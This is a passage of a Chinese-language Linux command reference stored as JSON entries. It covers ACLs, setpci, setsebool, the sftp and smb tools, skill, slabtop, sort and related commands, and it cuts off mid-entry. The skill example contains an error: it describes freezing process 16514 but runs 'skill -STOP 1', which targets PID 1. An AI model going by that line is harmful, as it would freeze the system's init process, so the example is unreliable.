other::r-x\n```\n\n这里我们可以看到ACL定义了default选项，john用户拥有了default的read, write, excute/search permission。所有没有定义的default都将从file permission里copy过来，现在root用户在dir下建立一个test.txt文件。\n\n```\n[root@localhost ~]# touch ./dir/test.txt\n[root@localhost ~]# ls -l ./dir/test.txt\n-rw-rw-r--+ 1 root root 0 Jul 3 23:46 ./dir/test.txt\n\n[root@localhost ~]# getfacl --omit-header ./dir/test.txt\nuser::rw-\nuser:john:rw-\ngroup::rwx #effective:rw-\nmask::rw-\nother::r--\n```\n\n这里我们看到在dir下建立的文件john用户自动就有了read and write permission，\n\n **ACL相关命令** \n\n前面的例子中我们都注意到了getfacl命令是用来读取文件的ACL，setfacl是用来设定文件的Acess ACL。这里还有一个chacl是用来改变文件和目录的Access ACL and Default ACL，它的具体参数大家可以去看man page。我只想提及一下`chacl -B`。它可以彻底删除文件或者目录的ACL属性(包括Default ACL)，比如你即使用了`setfacl -x`删除了所有文件的ACL属性，那个+号还是会出现在文件的末尾，所以正确的删除方法应该是用`chacl -B`用cp来复制文件的时候我们现在可以加上`-p`选项。这样在拷贝文件的时候也将拷贝文件的ACL属性，对于不能拷贝的ACL属性将给出警告。\n\nmv命令将会默认地移动文件的ACL属性，同样如果操作不允许的情况下会给出警告。\n\n **需要注意的几点** \n\n如果你的文件系统不支持ACL的话，你也许需要重新mount你的file system：\n\n```\nmount -o remount, acl [mount point]\n```\n\n如果用chmod命令改变Linux file permission的时候相应的ACL值也会改变，反之改变ACL的值，相应的file permission也会改变。\n\n\n"},{"name":"setpci","categoryId":0,"data":"setpci\n\u003d\u003d\u003d\n\n查询和配置PCI设备的使用工具\n\n## 补充说明\n\n**setpci命令** 是一个查询和配置PCI设备的使用工具。\n\n### 语法  \n\n```\nsetpci(选项)(参数)\n```\n\n### 选项  \n\n```\n-v：显示指令执行的细节信息；\n-f：当没有任何操作需要完成时，不显示任何信息；\n-D：测试模式，并不真正将配置信息写入寄存器；\n-d：仅显示给定厂商和设备的信息；\n-s：仅显示指定总线、插槽上的设备或设备上的功能块信息。\n```\n\n### 参数  \n\n*   PCI设备：指定要配置的PCI设备；\n*   操作：指定要完成的配置操作。\n\n### 实例  \n\nLinux下调节笔记本屏幕亮度方法：\n\n首先进入终端输入lspci命令，列出各种设备的地址：\n\n```\nlspci\n00:00.0 host bridge: Intel Corporation Mobile 945GM/PM/GMS, 943/940GML and 945GT Express Memory Controller Hub (rev 03)\n00:02.0 VGA compatible controller: Intel Corporation Mobile 945GM/GMS, 943/940GML Express Integrated Graphics Controller (rev 03)\n00:02.1 Display controller: Intel Corporation Mobile 945GM/GMS/GME, 943/940GML Express Integrated Graphics Controller (rev 03)\n00:1b.0 Audio device: Intel Corporation N10/ICH 7 Family High Definition Audio Controller (rev 02)\n00:1c.0 PCI bridge: Intel Corporation N10/ICH 7 Family PCI Express Port 1 (rev 02)\n00:1c.1 PCI bridge: Intel Corporation N10/ICH 7 Family PCI Express Port 2 (rev 02)\n......\n```\n\n发现00:02.0是VGA设备，于是我们修改它的属性：\n\n```\nsudo setpci -s 00:02.0 F4.B\u003dFF\n```\n\n解释一下：\n\n*    **setpci**  是修改设备属性的命令。\n*    **-s**  表示接下来输入的是设备的地址。\n*    **00:02.0**  VGA设备地址（\u003c总线\u003e:\u003c接口\u003e.\u003c功能\u003e）。\n*    **F4**  要修改的属性的地址，这里应该表示“亮度”。\n*    **.B**  修改的长度（B应该是字节（Byte），还有w（应该是Word，两个字节）、L（应该是Long，4个字节））。\n*    **\u003dFF**  要修改的值（可以改）。\n\n我这里00是最暗，FF是最亮，不同的电脑可能不一样。比如说我嫌FF太闪眼了，我就可以：\n\n```\nsudo setpci -s 00:02.0 F4.B\u003dCC\n```\n\n\n"},{"name":"setsebool","categoryId":0,"data":"setsebool\n\u003d\u003d\u003d\n\n修改SElinux策略内各项规则的布尔值\n\n## 补充说明\n\n**setsebool命令** 是用来修改SElinux策略内各项规则的布尔值。setsebool命令和getsebool命令是SELinux修改和查询布尔值的一套工具组。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。\n\n### 语法  \n\n```\nsetsebool [-P] 布尔值\u003d[0|1]\n```\n\n### 选项  \n\n```\n-P:直接将设置值写入配置文件，该设置数据将来会生效的。\n```\n\n### 实例  \n\n允许vsvtp匿名用户写入权限：\n\n```\nsetsebool -P allow_ftpd_anon_write\u003d1\n```\n\n如果你希望你的ftp用户可以访问自己的家目录的话，需要开启：\n\n```\nsetsebool -P ftp_home_dir 1\n```\n\n如果你希望将vsftpd以daemon的方式运行的话，需要开启：\n\n```\nsetsebool -P ftpd_is_daemon 1\n```\n\n你可以让SElinux停止保护vsftpd的daemon方式动行：\n\n```\nsetsebool -P ftpd_disable_trans 1 \n```\n\nHTTP被设置允许cgi的设置：\n\n```\nsetsebool -P httpd_enable_cgi 1\n```\n\n允许用户HHTP访问其家目录，该设定限仅于用户的家目录主页：\n\n```\nsetsebool -P httpd_enable_homedirs 1\nchcon -R -t httpd_sys_content_t ~user/public_html\n```\n\n允许httpd访问终端：\n\n```\nsetsebool -P httpd_tty_comm 1\n```\n\n关闭Selinux的关于httpd进程守护的保护：\n\n```\nsetsebool -P httpd_disable_trans 1\nservice httpd restart\n```\n\n关于named、master更新selinux设定：\n\n```\nsetsebool -P named_write_master_zones 1\n```\n\n关闭named的进程守护保护：\n\n```\nsetsebool -P named_disable_trans 1\nservice named restart\n```\n\nSelinux将本机的NFS共享设置成只读：\n\n```\nsetsebool -P nfs_export_all_ro 1\n```\n\nSElinux将本机的NFS共享设置成可读可写：\n\n```\nsetsebool -P nfs_export_all_rw 1\n```\n\n如果你想要将远程NFS的家目录共享到本机，需要开启：\n\n```\nsetsebool -P use_nfs_home_dirs 1\n```\n\n如果samba服务器共享目录给多个域，则需要：\n\n```\nsetsebool -P allow_smbd_anon_write\u003d1\n```\n\nsamba服务器要共享家目录时：\n\n```\nsetsebool -P samba_enable_home_dirs 1\n```\n\n如果你需在本机上使用远程samba服务器的家目录：\n\n```\nsetsebool -P use_samba_home_dirs 1\n```\n\n关闭selinux关于samba的进程守护的保护：\n\n```\nsetsebool -P smbd_disable_trans 1\nservice smb restart\n```\n\n允许rsync其他用户写入时：\n\n```\nsetsebool -P allow_rsync_anon_write\u003d1\n```\n\n停止rsync的进程保护\n\n```\nsetsebool -P rsync_disable_trans 1\n```\n\n允许系统使用kerberos：\n\n```\nsetsebool -P allow_kerberos 1\n```\n\n系统工作在nis环境时：\n\n```\nsetsebool -P allow_ypbind 1\n```\n\n\n"},{"name":"sftp","categoryId":0,"data":"sftp\n\u003d\u003d\u003d\n\n交互式的文件传输程序\n\n## 补充说明\n\n**sftp命令** 是一款交互式的文件传输程序，命令的运行和使用方式与ftp命令相似，但是，sftp命令对传输的所有信息使用ssh加密，它还支持公钥认证和压缩等功能。\n\n### 语法  \n\n```\nsftp(选项)(参数)\n```\n\n### 选项  \n\n```\n-B：指定传输文件时缓冲区的大小；\n-l：使用ssh协议版本1；\n-b：指定批处理文件；\n-C：使用压缩；\n-o：指定ssh选项；\n-F：指定ssh配置文件；\n-R：指定一次可以容忍多少请求数；\n-v：升高日志等级。\n```\n\n### 参数  \n\n目标主机：指定sftp服务器ip地址或者主机名。\n\n\n"},{"name":"sftp-server","categoryId":0,"data":"sftp-server\n\u003d\u003d\u003d\n\nsftp协议的服务器端程序\n\n## 补充说明\n\n**sftp-server命令** 是一个“sftp”协议的服务器端程序，它使用加密的方式进行文件传输。\n\n### 语法  \n\n```\nsftp-server\n```\n\n\n"},{"name":"sh","categoryId":0,"data":"sh\n\u003d\u003d\u003d\n\nshell命令解释器\n\n## 补充说明\n\n**sh命令** 是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取。通过用户输入命令，和内核进行沟通！Bourne Again Shell （即bash）是自由软件基金会（GNU）开发的一个Shell，它是Linux系统中一个默认的Shell。Bash不但与Bourne Shell兼容，还继承了C Shell、Korn Shell等优点。\n\n### 语法  \n\n```\nbash [options] [file]\n```\n\n### 选项  \n\n```\n-c string：命令从-c后的字符串读取。\n-i：实现脚本交互。\n-n：进行shell脚本的语法检查。\n-x：实现shell脚本逐条语句的跟踪。\n```\n\n### 实例  \n\n使用-x选项跟踪脚本调试shell脚本，能打印出所执行的每一行命令以及当前状态：\n\n```\n[root@AY1307311912260196fcZ satools]# sh -x check_ssh_login.sh\n+ DEFINE\u003d30\n+ cat /var/log/secure\n+ awk \u0027/Failed/ {++ip[$(NF-3)]} END {for (i in ip) print i\"\u003d\"ip[i]}\u0027\n++ cat /root/satools/black.txt\n+ for i in \u0027`cat /root/satools/black.txt`\u0027\n++ echo 121.42.0.16\u003d1427\n++ awk -F\u003d \u0027{print $1}\u0027\n+ IP\u003d121.42.0.16\n++ echo 121.42.0.16\u003d1427\n++ awk -F\u003d \u0027{print $2}\u0027\n+ NUM\u003d1427\n+ \u0027[\u0027 1427 -gt 30 \u0027]\u0027\n+ grep 121.42.0.16 /etc/hosts.deny\n+ \u0027[\u0027 1 -gt 0 \u0027]\u0027\n+ echo sshd:121.42.0.16\n+ echo vsftpd:121.42.0.16\n+ for i in \u0027`cat /root/satools/black.txt`\u0027\n++ echo 121.42.0.72\u003d276\n++ awk -F\u003d \u0027{print $1}\u0027\n+ IP\u003d121.42.0.72\n++ awk -F\u003d \u0027{print $2}\u0027\n++ echo 121.42.0.72\u003d276\n+ NUM\u003d276\n+ \u0027[\u0027 276 -gt 30 \u0027]\u0027\n+ grep 121.42.0.72 /etc/hosts.deny\n+ \u0027[\u0027 1 -gt 0 \u0027]\u0027\n+ echo sshd:121.42.0.72\n+ echo vsftpd:121.42.0.72\n```\n\n\n"},{"name":"shopt","categoryId":0,"data":"shopt\n\u003d\u003d\u003d\n\n显示和设置shell操作选项\n\n## 补充说明\n\n**shopt命令** 用于显示和设置shell中的行为选项，通过这些选项以增强shell易用性。shopt命令若不带任何参数选项，则可以显示所有可以设置的shell操作选项。\n\n### 语法  \n\n```\nshopt(选项)(参数)\n```\n\n### 选项  \n\n```\n-s：激活指定的shell行为选项；\n-u：关闭指定的shell行为选项。\n```\n\n### 参数  \n\nshell选项：指定要操作的shell选项。\n\n### 实例  \n\n使用shopt命令显示当前所有可以设置的shell操作选项，输入如下命令：\n\n```\nshopt           #输出所有可以设置的shell操作选项\ncdable_vars     off\ncdspell         off\ncheckhash       off\ncheckwinsize    on\ncmdhist         on\ndotglob         off\nexecfail        off\nexpand_aliases  on\nextdebug        off\n...\n```\n\n如图上所示，选项\"cdspell\"的状态为\"off\"，即关闭cd拼写检查选项。现在，可以使用shopt命令将其开启，输入如下命令：\n\n```\nshopt -s cdspell          #开启cd拼写检查\n```\n\n执行上面的命令后，该选项的状态将变为\"on\"，即开启状态。可以再次通过该命令显示一下shell操作选项即可，输出信息如下：\n\n```\ncdspell on                #开启cdspell选项\n```\n\n用户可以通过实际执行cd命令检查该选项是否被成功开启。\n\n\n"},{"name":"showmount","categoryId":0,"data":"showmount\n\u003d\u003d\u003d\n\n显示NFS服务器加载的信息\n\n## 补充说明\n\n**showmount命令** 查询“mountd”守护进程，以显示NFS服务器加载的信息。\n\n### 语法  \n\n```\nshowmount(选项)(参数)\n```\n\n### 选项  \n\n```\n-d：仅显示已被NFS客户端加载的目录；\n-e：显示NFS服务器上所有的共享目录。\n```\n\n### 参数  \n\nNFS服务器：指定NFS服务器的ip地址或者主机名。\n\n\n"},{"name":"shutdown","categoryId":2,"data":"shutdown\n\u003d\u003d\u003d\n\n用来执行系统关机的命令\n\n## 补充说明\n\n**shutdown命令** 用来系统关机命令。shutdown指令可以关闭所有程序，并依用户的需要，进行重新开机或关机的动作。\n\n### 语法  \n\n```\nshutdown(选项)(参数)\n```\n\n### 选项  \n\n```\n-c：当执行“shutdown -h 11:50”指令时，只要按+键就可以中断关机的指令；\n-f：重新启动时不执行fsck；\n-F：重新启动时执行fsck；\n-h：将系统关机；\n-k：只是送出信息给所有用户，但不会实际关机；\n-n：不调用init程序进行关机，而由shutdown自己进行；\n-r：shutdown之后重新启动；\n-t\u003c秒数\u003e：送出警告信息和删除信息之间要延迟多少秒。\n```\n\n### 参数  \n\n*   [时间]：设置多久时间后执行shutdown指令；\n*   [警告信息]：要传送给所有登入用户的信息。\n\n### 实例  \n\n指定现在立即关机：\n\n```\nshutdown -h now\n```\n\n指定5分钟后关机，同时送出警告信息给登入用户：\n\n```\nshutdown +5 \"System will shutdown after 5 minutes\"\n```\n\n\n"},{"name":"skill","categoryId":0,"data":"skill\n\u003d\u003d\u003d\n\n向选定的进程发送信号冻结进程\n\n## 补充说明\n\n**skill命令** 用于向选定的进程发送信号，冻结进程。这个命令初学者并不常用，深入之后牵涉到系统服务优化之后可能会用到。\n\n### 语法  \n\n```\nskill(选项)\n```\n\n### 选项  \n\n```\n-f：快速模式；\n-i：交互模式，每一步操作都需要确认；\n-v：冗余模式；\n-w：激活模式；\n-V：显示版本号；\n-t：指定开启进程的终端号；\n-u：指定开启进程的用户；\n-p：指定进程的id号；\n-c：指定开启进程的指令名称。\n```\n\n### 实例  \n\n如果您发现了一个占用大量CPU和内存的进程，但又不想停止它，该怎么办？考虑下面的top命令输出：\n\n```\ntop -c -p 16514\n23:00:44  up 12 days,  2:04,  4 users,  load average: 0.47, 0.35, 0.31\n1 processes: 1 sleeping, 0 running, 0 zombie, 0 stopped\nCPU states:  cpu    user    nice  system    irq  softirq  iowait    idle\n           total    0.0%    0.6%    8.7%   2.2%     0.0%   88.3%    0.0%\nMem:  1026912k av, 1010476k used,   16436k free,       0k shrd,   52128k buff\n                    766724k actv,  143128k in_d,   14264k in_c\nSwap: 2041192k av,   83160k used, 1958032k free                  799432k cached\n\n  PID USER     PRI  NI  SIZE  RSS SHARE stat %CPU %MEM   time CPU command\n16514 oracle    19   4 28796  26M 20252 D N   7.0  2.5   0:03   0 oraclePRODB2...\n```\n\n既然您确认进程16514占用了大量内存，您就可以使用skill命令“冻结”它，而不是停止它。\n\n```\nskill -STOP 1\n```\n\n之后，检查top输出：\n\n```\n23:01:11  up 12 days,  2:05,  4 users,  load average: 1.20, 0.54, 0.38\n1 processes: 0 sleeping, 0 running, 0 zombie, 1 stopped\nCPU states:  cpu    user    nice  system    irq  softirq  iowait    idle\n           total    2.3%    0.0%    0.3%   0.0%     0.0%    2.3%   94.8%\nMem:  1026912k av, 1008756k used,   18156k free,       0k shrd,    3976k buff\n                    770024k actv,  143496k in_d,   12876k in_c\nSwap: 2041192k av,   83152k used, 1958040k free                  851200k cached\n\n  PID USER     PRI  NI  SIZE  RSS SHARE STAT %CPU %MEM   TIME CPU COMMAND\n16514 oracle    19   4 28796  26M 20252 T N   0.0  2.5   0:04   0 oraclePRODB2...\n```\n\n现在，CPU 从 0% 空闲变为 94% 空闲。该进程被有效冻结。过一段时间之后，您可能希望唤醒该进程：\n\n```\nskill -CONT 16514\n```\n\n如果希望暂时冻结进程以便为完成更重要的进程腾出空间，该方法非常有用。\n\n此命令用途很广。如果您要停止 \"oracle\" 用户的所有进程，只需要一个命令即可实现：\n\n```\nskill -STOP oracle\n```\n\n可以使用用户、PID、命令或终端 id 作为参数。以下命令可停止所有 rman 命令。\n\n```\nskill -STOP rman\n```\n\n如您所见，skill 决定您输入的参数（进程 ID、用户 ID 或命令）并进行相应操作。这可能会导致在某些情况下出现这样的问题：您可能具有同名的用户和命令。最好的示例是 \"oracle\" 进程，通常由用户 \"oracle\" 运行。因此，当您希望停止名为 \"oracle\" 的进程时，可执行以下命令：\n\n```\nskill -STOP oracle\n```\n\n用户 \"oracle\" 的所有进程都停止，包括您可能要使用的会话。要非常明确地执行命令，您可以选择使用一个新参数指定参数的类型。要停止一个名为 oracle 的命令，可执行以下命令：\n\n```\nskill -STOP -c oracle\n```\n\nsnice命令的功能与skill类似。但它用于降低进程的优先级，而不是停止进程。首先，检查 top 输出：\n\n```\n  PID USER     PRI  NI  SIZE  RSS SHARE STAT %CPU %MEM   TIME CPU COMMAND\n    3 root      15   0     0    0     0 RW    0.0  0.0   0:00   0 kapmd\n13680 oracle    15   0 11336  10M  8820 T     0.0  1.0   0:00   0 oracle\n13683 oracle    15   0  9972 9608  7788 T     0.0  0.9   0:00   0 oracle\n13686 oracle    15   0  9860 9496  7676 T     0.0  0.9   0:00   0 oracle\n13689 oracle    15   0 10004 9640  7820 T     0.0  0.9   0:00   0 oracle\n13695 oracle    15   0  9984 9620  7800 T     0.0  0.9   0:00   0 oracle\n13698 oracle    15   0 10064 9700  7884 T     0.0  0.9   0:00   0 oracle\n13701 oracle    15   0 22204  21M 16940 T     0.0  2.1   0:00   0 oracle\n```\n\n现在，将 \"oracle\" 进程的优先级降低四个点。注意，该值越高，优先级越低。\n\n```\nsnice +4 -u oracle\n  PID USER     PRI  NI  SIZE  RSS SHARE STAT %CPU %MEM   TIME CPU COMMAND\n16894 oracle    20   4 38904  32M 26248 D N   5.5  3.2   0:01   0 oracle\n```\n\n注意，NI 列（nice 值）现在是 4，优先级现在设置为 20，而不是 15。这对于降低优先级非常有帮助。\n\n\n"},{"name":"slabtop","categoryId":0,"data":"slabtop\n\u003d\u003d\u003d\n\n实时显示内核slab内存缓存信息\n\n## 补充说明\n\n**slabtop命令** 以实时的方式显示内核“slab”缓冲区的细节信息。\n\n### 语法  \n\n```\nslabtop(选项)\n```\n\n### 选项  \n\n```\n--delay\u003dn, -d n：每n秒更新一次显示的信息，默认是每3秒；\n--sort\u003dS, -s S：指定排序标准进行排序（排序标准，参照下面或者man手册）；\n--once, -o：显示一次后退出；\n--version, -V：显示版本；\n--help：显示帮助信息。\n```\n\n排序标准：\n\n*   a: sort by number of active objects\n*   b: sort by objects per slab\n*   c: sort by cache size\n*   l: sort by number of slabs\n*   v：sort by number of active slabs\n*   n: sort by name\n*   o: sort by number of objects\n*   p: sort by pages per slab\n*   s: sort by object size\n*   u: sort by cache utilization\n\n### 知识扩展  \n\n内核的模块在分配资源的时候，为了提高效率和资源的利用率，都是透过slab来分配的。通过slab的信息，再配合源码能粗粗了解系统的运行情况，比如说什么资源有没有不正常的多，或者什么资源有没有泄漏。linux系统透过/proc/slabinfo来向用户暴露slab的使用情况。\n\nLinux 所使用的 slab 分配器的基础是 Jeff Bonwick 为 SunOS 操作系统首次引入的一种算法。Jeff 的分配器是围绕对象缓存进行的。在内核中，会为有限的对象集（例如文件描述符和其他常见结构）分配大量内存。Jeff 发现对内核中普通对象进行初始化所需的时间超过了对其进行分配和释放所需的时间。因此他的结论是不应该将内存释放回一个全局的内存池，而是将内存保持为针对特定目而初始化的状态。Linux slab 分配器使用了这种思想和其他一些思想来构建一个在空间和时间上都具有高效性的内存分配器。\n\n保存着监视系统中所有活动的 slab 缓存的信息的文件为/proc/slabinfo。\n\n### 实例  \n\n```\nslabtop\n\n Active / Total Objects (% used)    : 897519 / 1245930 (72.0%)\n Active / Total Slabs (% used)      : 38605 / 38605 (100.0%)\n Active / Total Caches (% used)     : 94 / 145 (64.8%)\n Active / Total Size (% used)       : 129558.22K / 153432.58K (84.4%)\n Minimum / Average / Maximum Object : 0.01K / 0.12K / 128.00K\n\n  OBJS ACTIVE  USE OBJ SIZE  SLABS OBJ/SLAB CACHE SIZE NAME                   \n440136 171471  38%    0.05K   6113       72     24452K buffer_head\n190086 148576  78%    0.05K   2437       78      9748K selinux_inode_security\n151840 146366  96%    0.48K  18980        8     75920K ext3_inode_cache\n144333 144143  99%    0.02K    711      203      2844K avtab_node\n130529 128488  98%    0.13K   4501       29     18004K dentry_cache\n 99214  99071  99%    0.03K    878      113      3512K size-32\n 43834  28475  64%    0.27K   3131       14     12524K radix_tree_node\n 17818   9450  53%    0.06K    302       59      1208K size-64\n  4602   4562  99%    0.05K     59       78       236K sysfs_dir_cache\n  3220   2855  88%    0.08K     70       46       280K vm_area_struct\n  2460   2114  85%    0.12K     82       30       328K size-128\n  1564   1461  93%    0.04K     17       92        68K Acpi-Operand\n  1540   1540 100%    0.33K    140       11       560K inode_cache\n  1524    466  30%    0.01K      6      254        24K anon_vma\n  1440    515  35%    0.05K     20       72        80K avc_node\n  1440   1154  80%    0.19K     72       20       288K filp\n  1170   1023  87%    0.05K     15       78        60K ext3_xattr\n   845    724  85%    0.02K      5      169        20K Acpi-Namespace\n   638    315  49%    0.35K     58       11       232K proc_inode_cache\n   450    434  96%    0.25K     30       15       120K size-256\n   424    386  91%    0.50K     53        8       212K size-512\n   312    107  34%    0.05K      4       78        16K delayacct_cache\n   306    284  92%    0.43K     34        9       136K shmem_inode_cache\n   303    108  35%    0.04K      3      101        12K pid\n   300    261  87%    0.19K     15       20        60K skbuff_head_cache\n   300    300 100%    0.12K     10       30        40K bio\n   260    260 100%   32.00K    260        1      8320K size-32768\n   254      6   2%    0.01K      1      254         4K revoke_table\n   236     55  23%    0.06K      4       59        16K fs_cache\n   216    203  93%    1.00K     54        4       216K size-1024\n   214    214 100%    2.00K    107        2       428K size-2048\n   203     83  40%    0.02K      1      203         4K biovec-1\n```\n\n\n"},{"name":"sleep","categoryId":0,"data":"sleep\n\u003d\u003d\u003d\n\n将目前动作延迟一段时间\n\n## 补充说明\n\n**sleep命令** 暂停指定的时间。\n\n### 语法  \n\n```\nsleep(参数)\n```\n\n### 参数  \n\n时间：指定要暂停时间的长度。\n\n时间长度，后面可接 s、m、h 或 d，其中 s 为秒，m 为 分钟，h 为小时，d 为日数。\n\n### 实例  \n\n有时在写一些以循环方式运行的监控脚本，设置时间间隔是必不可少的，下面是一个Shell进度条的脚本演示在脚本中生成延时。\n\n```\n#!/bin/bash\n\nb\u003d\u0027\u0027\nfor ((i\u003d0;$i\u003c\u003d100;i++))\n do\n printf \"Progress:[%-100s]%d%%\\r\" $b $i\n sleep 0.1\n b\u003d#$b\n done\necho\n```\n\n\n"},{"name":"smbclient","categoryId":0,"data":"smbclient\n\u003d\u003d\u003d\n\n交互方式访问samba服务器\n\n## 补充说明\n\n**smbclient命令** 属于samba套件，它提供一种命令行使用交互式方式访问samba服务器的共享资源。\n\n### 语法  \n\n```\nsmbclient(选项)(参数)\n```\n\n### 选项  \n\n```\n-B\u003cip地址\u003e：传送广播数据包时所用的IP地址；\n-d\u003c排错层级\u003e：指定记录文件所记载事件的详细程度；\n-E：将信息送到标准错误输出设备；\n-h：显示帮助；\n-i\u003c范围\u003e：设置NetBIOS名称范围；\n-I\u003cIP地址\u003e：指定服务器的IP地址；\n-l\u003c记录文件\u003e：指定记录文件的名称；\n-L：显示服务器端所分享出来的所有资源；\n-M\u003cNetBIOS名称\u003e：可利用WinPopup协议，将信息送给选项中所指定的主机；\n-n\u003cNetBIOS名称\u003e：指定用户端所要使用的NetBIOS名称；\n-N：不用询问密码；\n-O\u003c连接槽选项\u003e：设置用户端TCP连接槽的选项；\n-p\u003cTCP连接端口\u003e：指定服务器端TCP连接端口编号；\n-R\u003c名称解析顺序\u003e：设置NetBIOS名称解析的顺序；\n-s\u003c目录\u003e：指定smb.conf所在的目录；\n-t\u003c服务器字码\u003e：设置用何种字符码来解析服务器端的文件名称；\n-T\u003ctar选项\u003e：备份服务器端分享的全部文件，并打包成tar格式的文件；\n-U\u003c用户名称\u003e：指定用户名称；\n-w\u003c工作群组\u003e：指定工作群组名称。\n```\n\n### 参数  \n\nsmb服务器：指定要连接的smb服务器。\n\n### 实例  \n\n **列出某个IP地址所提供的共享文件夹** \n\n```\nsmbclient -L 198.168.0.1 -U username%password\n```\n\n **像ftp客户端一样使用smbclient** \n\n```\nsmbclient //192.168.0.1/tmp  -U username%password\n```\n\n执行smbclient命令成功后，进入smbclient环境，出现提示符：`smb:/\u003e`\n\n这里有许多命令和ftp命令相似，如cd 、lcd、get、megt、put、mput等。通过这些命令，我们可以访问远程主机的共享资源。\n\n **直接一次性使用smbclient命令** \n\n```\nsmbclient -c \"ls\"  //192.168.0.1/tmp  -U username%password\n```\n\n和\n\n```\nsmbclient //192.168.0.1/tmp  -U username%password\nsmb:/\u003els\n```\n\n功能一样的。\n\n **创建一个共享文件夹** \n\n```\nsmbclient -c \"mkdir share1\" //192.168.0.1/tmp -U username%password\n```\n\n如果用户共享`//192.168.0.1/tmp`的方式是只读的，会提示`NT_STATUS_ACCESS_DENIED making remote directory /share1`\n\n\n"},{"name":"smbpasswd","categoryId":0,"data":"smbpasswd\n\u003d\u003d\u003d\n\nsamba用户和密码管理工具\n\n## 补充说明\n\n**smbpasswd命令** 属于samba套件，能够实现添加或删除samba用户和为用户修改密码。\n\n### 语法  \n\n```\nsmbpasswd(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：向smbpasswd文件中添加用户；\n-c：指定samba的配置文件；\n-x：从smbpasswd文件中删除用户；\n-d：在smbpasswd文件中禁用指定的用户；\n-e：在smbpasswd文件中激活指定的用户；\n-n：将指定的用户的密码置空。\n```\n\n### 参数  \n\n用户名：指定要修改SMB密码的用户。\n\n\n"},{"name":"sort","categoryId":1,"data":"sort\n\u003d\u003d\u003d\n\n将文件进行排序并输出\n\n## 补充说明\n\n**sort命令** 是在Linux里非常有用，它将文件进行排序，并将排序结果标准输出。sort命令既可以从特定的文件，也可以从stdin中获取输入。\n\n### 语法  \n\n```\nsort(选项)(参数)\n```\n\n### 选项  \n\n```\n-b：忽略每行前面开始出的空格字符；\n-c：检查文件是否已经按照顺序排序；\n-d：排序时，处理英文字母、数字及空格字符外，忽略其他的字符；\n-f：排序时，将小写字母视为大写字母；\n-i：排序时，除了040至176之间的ASCII字符外，忽略其他的字符；\n-m：将几个排序号的文件进行合并；\n-M：将前面3个字母依照月份的缩写进行排序；\n-n：依照数值的大小排序；\n-o\u003c输出文件\u003e：将排序后的结果存入制定的文件；\n-r：以相反的顺序来排序；\n-t\u003c分隔字符\u003e：指定排序时所用的栏位分隔字符；\n+\u003c起始栏位\u003e-\u003c结束栏位\u003e：以指定的栏位来排序，范围由起始栏位到结束栏位的前一栏位。\n```\n\n### 参数  \n\n文件：指定待排序的文件列表。\n\n### 实例  \n\nsort将文件/文本的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。\n\n```\nroot@[mail text]# cat sort.txt\naaa:10:1.1\nccc:30:3.3\nddd:40:4.4\nbbb:20:2.2\neee:50:5.5\neee:50:5.5\n\n[root@mail text]# sort sort.txt\naaa:10:1.1\nbbb:20:2.2\nccc:30:3.3\nddd:40:4.4\neee:50:5.5\neee:50:5.5\n```\n\n忽略相同行使用-u选项或者uniq：\n\n```\n[root@mail text]# cat sort.txt\naaa:10:1.1\nccc:30:3.3\nddd:40:4.4\nbbb:20:2.2\neee:50:5.5\neee:50:5.5\n\n[root@mail text]# sort -u sort.txt\naaa:10:1.1\nbbb:20:2.2\nccc:30:3.3\nddd:40:4.4\neee:50:5.5\n\n或者\n\n[root@mail text]# uniq sort.txt\naaa:10:1.1\nccc:30:3.3\nddd:40:4.4\nbbb:20:2.2\neee:50:5.5\n\n```\n\nsort的-n、-r、-k、-t选项的使用：\n\n```\n[root@mail text]# cat sort.txt\nAAA:BB:CC\naaa:30:1.6\nccc:50:3.3\nddd:20:4.2\nbbb:10:2.5\neee:40:5.4\neee:60:5.1\n\n#将BB列按照数字从小到大顺序排列：\n[root@mail text]# sort -nk 2 -t: sort.txt\nAAA:BB:CC\nbbb:10:2.5\nddd:20:4.2\naaa:30:1.6\neee:40:5.4\nccc:50:3.3\neee:60:5.1\n\n#将CC列数字从大到小顺序排列：\n[root@mail text]# sort -nrk 3 -t: sort.txt\neee:40:5.4\neee:60:5.1\nddd:20:4.2\nccc:50:3.3\nbbb:10:2.5\naaa:30:1.6\nAAA:BB:CC\n\n# -n是按照数字大小排序，-r是以相反顺序，-k是指定需要爱排序的栏位，-t指定栏位分隔符为冒号\n```\n\n **-k选项的具体语法格式：** \n\n-k选项的语法格式：\n\n```\nFStart.CStart Modifie,FEnd.CEnd Modifier\n-------Start--------,-------End--------\n FStart.CStart 选项  ,  FEnd.CEnd 选项\n\n```\n\n这个语法格式可以被其中的逗号`,`分为两大部分， **Start** 部分和 **End** 部分。Start部分也由三部分组成，其中的Modifier部分就是我们之前说过的类似n和r的选项部分。我们重点说说`Start`部分的`FStart`和`C.Start`。`C.Start`也是可以省略的，省略的话就表示从本域的开头部分开始。`FStart.CStart`，其中`FStart`就是表示使用的域，而`CStart`则表示在`FStart`域中从第几个字符开始算“排序首字符”。同理，在End部分中，你可以设定`FEnd.CEnd`，如果你省略`.CEnd`，则表示结尾到“域尾”，即本域的最后一个字符。或者，如果你将CEnd设定为0(零)，也是表示结尾到“域尾”。\n\n从公司英文名称的第二个字母开始进行排序：\n\n```\n$ sort -t \u0027 \u0027 -k 1.2 facebook.txt\nbaidu 100 5000\nsohu 100 4500\ngoogle 110 5000\nguge 50 3000\n\n```\n\n使用了`-k 1.2`，表示对第一个域的第二个字符开始到本域的最后一个字符为止的字符串进行排序。你会发现baidu因为第二个字母是a而名列榜首。sohu和 google第二个字符都是o，但sohu的h在google的o前面，所以两者分别排在第二和第三。guge只能屈居第四了。\n\n只针对公司英文名称的第二个字母进行排序，如果相同的按照员工工资进行降序排序：\n\n```\n$ sort -t \u0027 \u0027 -k 1.2,1.2 -nrk 3,3 facebook.txt\nbaidu 100 5000\ngoogle 110 5000\nsohu 100 4500\nguge 50 3000\n\n```\n\n由于只对第二个字母进行排序，所以我们使用了`-k 1.2,1.2`的表示方式，表示我们“只”对第二个字母进行排序。（如果你问“我使用`-k 1.2`怎么不行？”，当然不行，因为你省略了End部分，这就意味着你将对从第二个字母起到本域最后一个字符为止的字符串进行排序）。对于员工工资进行排 序，我们也使用了`-k 